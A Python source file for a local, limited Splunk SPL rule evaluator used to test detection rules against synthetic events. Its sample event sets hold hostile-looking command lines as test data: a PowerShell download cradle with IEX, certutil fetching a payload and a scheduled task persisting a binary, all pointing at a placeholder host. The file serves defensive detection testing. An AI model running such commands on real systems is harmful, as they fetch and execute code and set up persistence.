"""Local SPL test evaluator for the Detection Rule Testing Lab.

WHAT THIS IS NOT
================
This is **not** Splunk. It is a deliberately limited, deterministic evaluator
for a small subset of SPL, used to answer one question offline:

    "Does this rule match the events I expect it to?"

It does not implement Splunk's search semantics, tokenisation, macros,
lookups, subsearches, time ranges or the statistics pipeline. Any construct it
does not understand is reported explicitly as unsupported — it is never
silently ignored and never folded into a match/non-match verdict.

Supported subset
----------------
* `field=value` and `field!=value` comparisons
* `*` wildcards inside a quoted or bare value
* Numeric comparisons: `>` `<` `>=` `<=`
* Boolean composition with `AND`, `OR`, `NOT` and parentheses
* Implicit AND between adjacent terms (Splunk's default)
* The leading search portion of a query, up to the first `|`

Everything after the first pipe (`| stats`, `| eval`, …) is a transforming
command. Those change the shape of the result set rather than which raw events
match, so they are recorded as unsupported and excluded from evaluation.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

# Guard rails: a pathological rule or event set must not hang the request.
MAX_TERMS = 200
MAX_EVENTS = 200
MAX_QUERY_CHARS = 20000


class MatchOutcome(str, Enum):
    MATCH = "match"
    NO_MATCH = "no_match"
    # The rule contains logic this evaluator cannot model (e.g. NOT), so no
    # honest match verdict is possible. Never counted as a pass or a fail.
    UNEVALUABLE = "unevaluable"
    # An error occurred while evaluating this event.
    ERROR = "error"


@dataclass
class FieldObservation:
    """Why one condition passed or failed against one event."""

    field: str
    operator: str
    expected: str
    actual: str | None
    matched: bool
    missing: bool = False


@dataclass
class EventResult:
    """Outcome for a single test event."""

    event_id: str
    outcome: MatchOutcome
    observations: list[FieldObservation] = field(default_factory=list)
    missing_fields: list[str] = field(default_factory=list)
    reason: str = ""


@dataclass
class EvaluationReport:
    """Result of testing one rule against a set of events."""

    supported: bool
    results: list[EventResult] = field(default_factory=list)
    unsupported: list[str] = field(default_factory=list)
    referenced_fields: list[str] = field(default_factory=list)
    # Present when the rule could not be parsed into anything testable.
    error: str = ""


# --------------------------------------------------------------- tokenizing

# field <op> value, where value may be quoted or bare.
_CONDITION = re.compile(
    r'(?P<field>[A-Za-z_][\w.]*)\s*(?P<op>!=|>=|<=|=|>|<)\s*'
    r'(?P<value>"(?:[^"\\]|\\.)*"|\S+)'
)

_BOOLEAN = re.compile(r'\b(AND|OR|NOT)\b')

# Constructs we recognise well enough to name when refusing to evaluate them.
_KNOWN_UNSUPPORTED = {
    "subsearch": re.compile(r"\[\s*search\b", re.IGNORECASE),
    "macro": re.compile(r"`[^`]+`"),
    "lookup": re.compile(r"\blookup\b", re.IGNORECASE),
    "inputlookup": re.compile(r"\binputlookup\b", re.IGNORECASE),
    "regex comparison": re.compile(r"\|\s*regex\b", re.IGNORECASE),
    "IN operator": re.compile(r"\bIN\s*\(", re.IGNORECASE),
    "time modifier": re.compile(r"\bearliest\s*=|\blatest\s*=", re.IGNORECASE),
}


def _unquote(value: str) -> str:
    if len(value) >= 2 and value[0] == '"' and value[-1] == '"':
        return value[1:-1]
    return value


def _wildcard_match(pattern: str, actual: str) -> bool:
    """Case-insensitive glob match, mirroring SPL's `*` wildcard."""
    if "*" not in pattern:
        return pattern.lower() == actual.lower()
    regex = "^" + "".join(
        ".*" if char == "*" else re.escape(char) for char in pattern
    ) + "$"
    return re.match(regex, actual, re.IGNORECASE) is not None


def _compare(operator: str, expected: str, actual: Any) -> bool:
    """Apply one comparison. Numeric operators require numeric operands.

    A list operand is treated as a multivalue field: an `=` matches when any
    value matches, and `!=` requires none of them to match, mirroring Splunk's
    multivalue behaviour.
    """
    if isinstance(actual, (list, tuple)):
        if operator == "!=":
            return all(_compare("!=", expected, item) for item in actual)
        return any(_compare(operator, expected, item) for item in actual)

    actual_str = "" if actual is None else str(actual)

    if operator in ("=", "!="):
        result = _wildcard_match(expected, actual_str)
        return result if operator == "=" else not result

    # Numeric comparisons; a non-numeric operand simply does not match.
    try:
        left = float(actual_str)
        right = float(expected)
    except (TypeError, ValueError):
        return False

    if operator == ">":
        return left > right
    if operator == "<":
        return left < right
    if operator == ">=":
        return left >= right
    if operator == "<=":
        return left <= right
    return False


# ------------------------------------------------------------------ parsing


@dataclass
class _Condition:
    field: str
    operator: str
    expected: str


def _search_portion(query: str) -> tuple[str, list[str]]:
    """Return the leading search, plus any transforming commands found.

    Everything after the first pipe alters the result set rather than event
    matching, so it is excluded and reported.
    """
    unsupported: list[str] = []
    if "|" not in query:
        return query, unsupported

    head, _, tail = query.partition("|")
    for segment in tail.split("|"):
        name = segment.strip().split(" ")[0].strip()
        if name:
            unsupported.append(f"transforming command `| {name}` (not evaluated)")
    return head, unsupported


def _detect_unsupported(query: str) -> list[str]:
    """Name the constructs we deliberately refuse to interpret."""
    found: list[str] = []
    for label, pattern in _KNOWN_UNSUPPORTED.items():
        if pattern.search(query):
            found.append(f"{label} (not supported by the local evaluator)")
    return found


# A parenthesised group, e.g. (CommandLine="*a*" OR CommandLine="*b*").
_GROUP = re.compile(r"\(([^()]*)\)")


def _conditions_in(text: str) -> list[_Condition]:
    """Extract every field comparison in a fragment, in order."""
    return [
        _Condition(
            field=match.group("field"),
            operator=match.group("op"),
            expected=_unquote(match.group("value")),
        )
        for match in _CONDITION.finditer(text)
    ]


def parse_rule(query: str) -> tuple[list[list[_Condition]], list[str], str]:
    """Extract testable conditions as AND-groups of OR-alternatives.

    Returns (groups, unsupported notes, structural note).

    Each inner list is a set of alternatives joined by OR; the outer list is
    joined by AND. This covers the common `A AND (B OR C)` shape the generator
    produces. Structures it cannot represent — notably `NOT` and nested
    parentheses — are reported rather than guessed at.
    """
    if len(query) > MAX_QUERY_CHARS:
        return [], [f"query exceeds {MAX_QUERY_CHARS} characters"], ""

    search, unsupported = _search_portion(query)
    unsupported.extend(_detect_unsupported(query))

    groups: list[list[_Condition]] = []

    # Parenthesised groups become OR-alternatives when they contain OR,
    # otherwise each of their conditions is its own AND term.
    remainder = search
    for match in _GROUP.finditer(search):
        inner = match.group(1)
        conditions = _conditions_in(inner)
        if not conditions:
            continue
        if re.search(r"\bOR\b", inner):
            groups.append(conditions)
        else:
            groups.extend([condition] for condition in conditions)
        remainder = remainder.replace(match.group(0), " ", 1)

    # Bare conditions outside any parentheses are AND terms. A top-level OR
    # between them is a shape this evaluator does not model.
    bare = _conditions_in(remainder)
    if bare:
        if re.search(r"\bOR\b", remainder):
            # Treat the whole remainder as one OR-group rather than silently
            # requiring all of them.
            groups.append(bare)
        else:
            groups.extend([condition] for condition in bare)

    if sum(len(group) for group in groups) > MAX_TERMS:
        unsupported.append(f"more than {MAX_TERMS} conditions (truncated)")
        groups = groups[:MAX_TERMS]

    # NOT changes which events match; modelling it wrongly would produce a
    # confidently incorrect verdict, so it makes the rule unevaluable instead.
    structural = ""
    booleans = {m.group(1).upper() for m in _BOOLEAN.finditer(search)}
    if "NOT" in booleans:
        structural = (
            "This rule uses NOT, which the local evaluator does not model. No "
            "match verdict can be given for this rule."
        )

    return groups, unsupported, structural


# --------------------------------------------------------------- evaluation


def evaluate(query: str, events: list[dict[str, Any]]) -> EvaluationReport:
    """Test a rule against synthetic events.

    Deterministic and bounded. Fields absent from an event are reported as
    missing rather than treated as empty, because "the field was not collected"
    and "the field did not match" are different findings for an analyst.
    """
    groups, unsupported, structural = parse_rule(query or "")

    # A blocking structural limitation means every event is unevaluable: the
    # evaluator must not report match/no_match when it did not apply all logic.
    blocking = bool(structural)
    if structural:
        unsupported.append(structural)

    # `index=` and `sourcetype=` select the data source rather than filter
    # fields within an event, so they are not applied to synthetic events.
    source_selectors = {"index", "source", "sourcetype", "host"}
    testable = [
        [c for c in group if c.field.lower() not in source_selectors] for group in groups
    ]
    testable = [group for group in testable if group]

    referenced = sorted({c.field for group in testable for c in group})

    if not testable:
        return EvaluationReport(
            supported=False,
            unsupported=unsupported,
            referenced_fields=referenced,
            error=(
                "No testable field conditions were found in this rule. The local "
                "evaluator can only match on field comparisons."
            ),
        )

    results: list[EventResult] = []
    for index, event in enumerate(events[:MAX_EVENTS]):
        if not isinstance(event, dict):
            continue

        raw_id = event.get("_id") or event.get("id")
        event_id = str(raw_id) if raw_id else f"event-{index + 1}"

        observations: list[FieldObservation] = []
        missing: list[str] = []
        # Every AND-group must be satisfied by at least one of its alternatives.
        group_results: list[bool] = []
        failed_groups: list[str] = []

        for group in testable:
            group_matched = False
            for condition in group:
                present = condition.field in event
                actual = event.get(condition.field)
                matched = (
                    _compare(condition.operator, condition.expected, actual) if present else False
                )

                if not present and condition.field not in missing:
                    missing.append(condition.field)

                observations.append(
                    FieldObservation(
                        field=condition.field,
                        operator=condition.operator,
                        expected=condition.expected,
                        actual=None if not present else str(actual),
                        matched=matched,
                        missing=not present,
                    )
                )
                group_matched = group_matched or matched

            group_results.append(group_matched)
            if not group_matched:
                # Name the group by the field(s) it tests.
                fields = sorted({c.field for c in group})
                failed_groups.append("/".join(fields))

        all_matched = all(group_results)

        if blocking:
            # Relevant query logic was not evaluated, so neither match nor
            # no_match would be an honest answer.
            results.append(
                EventResult(
                    event_id=event_id,
                    outcome=MatchOutcome.UNEVALUABLE,
                    observations=observations,
                    missing_fields=sorted(set(missing)),
                    reason=structural,
                )
            )
            continue

        outcome = MatchOutcome.MATCH if all_matched else MatchOutcome.NO_MATCH

        if all_matched:
            reason = "All testable conditions matched."
        else:
            # A field absent from the event is a different finding from a value
            # that simply did not match, so report whichever actually applies.
            unmet_and_missing = [
                name
                for name in failed_groups
                if any(part in missing for part in name.split("/"))
            ]
            if unmet_and_missing:
                reason = f"Missing field(s): {', '.join(sorted(set(missing)))}."
            else:
                reason = f"Condition(s) did not match: {', '.join(failed_groups)}."

        results.append(
            EventResult(
                event_id=event_id,
                outcome=outcome,
                observations=observations,
                missing_fields=sorted(set(missing)),
                reason=reason,
            )
        )

    return EvaluationReport(
        supported=True,
        results=results,
        unsupported=unsupported,
        referenced_fields=referenced,
    )


# ------------------------------------------------- external adapter seam

class ExternalValidator:
    """Interface for an external Splunk validation adapter.

    The real implementation is ``api.services.splunk_client.SplunkValidator``,
    used by the quality checks and the rule library when SPLUNK_URL is set.
    This base class stays unimplemented so the local Testing Lab can never
    report external validation by accident.
    """

    available: bool = False

    def validate(self, query: str) -> dict[str, Any]:  # pragma: no cover - seam
        raise NotImplementedError(
            "No external Splunk validator is configured. Results in this tool are "
            "static checks and local sample matching only."
        )


# ----------------------------------------------------------- sample events

# Safe, synthetic sample events for common defensive detections. These are
# fabricated examples for testing rules, clearly labelled as such in the UI,
# and contain no real telemetry.
SAMPLE_EVENT_SETS: dict[str, dict[str, Any]] = {
    "powershell_download": {
        "label": "PowerShell download cradle",
        "description": "Two events that should match a PowerShell download rule, and two that should not.",
        "events": [
            {
                "_id": "ps-match-1",
                "_expect": "match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')",
                "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                "User": "CORP\\alice",
            },
            {
                "_id": "ps-match-2",
                "_expect": "match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell -enc SQBFAFgA... Invoke-WebRequest -Uri http://example.test/b.bin",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "User": "CORP\\bob",
            },
            {
                "_id": "ps-benign-1",
                "_expect": "no_match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -File C:\\Scripts\\Get-DiskSpace.ps1",
                "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
                "User": "CORP\\svc_monitor",
            },
            {
                "_id": "other-process-1",
                "_expect": "no_match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\notepad.exe",
                "CommandLine": "notepad.exe readme.txt",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "User": "CORP\\alice",
            },
        ],
    },
    "scheduled_task": {
        "label": "Scheduled task persistence",
        "description": "schtasks creation events alongside benign task queries.",
        "events": [
            {
                "_id": "task-match-1",
                "_expect": "match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": "schtasks.exe /create /sc minute /mo 5 /tn Updater /tr C:\\Users\\Public\\u.exe",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "CORP\\alice",
            },
            {
                "_id": "task-benign-1",
                "_expect": "no_match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": "schtasks.exe /query /fo LIST",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "CORP\\admin",
            },
        ],
    },
    "certutil_transfer": {
        "label": "Certutil LOLBin transfer",
        "description": "certutil used to download, contrasted with legitimate certificate use.",
        "events": [
            {
                "_id": "certutil-match-1",
                "_expect": "match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://example.test/p.bin p.bin",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "CORP\\bob",
            },
            {
                "_id": "certutil-benign-1",
                "_expect": "no_match",
                "EventCode": 1,
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -store My",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "CORP\\admin",
            },
        ],
    },
}
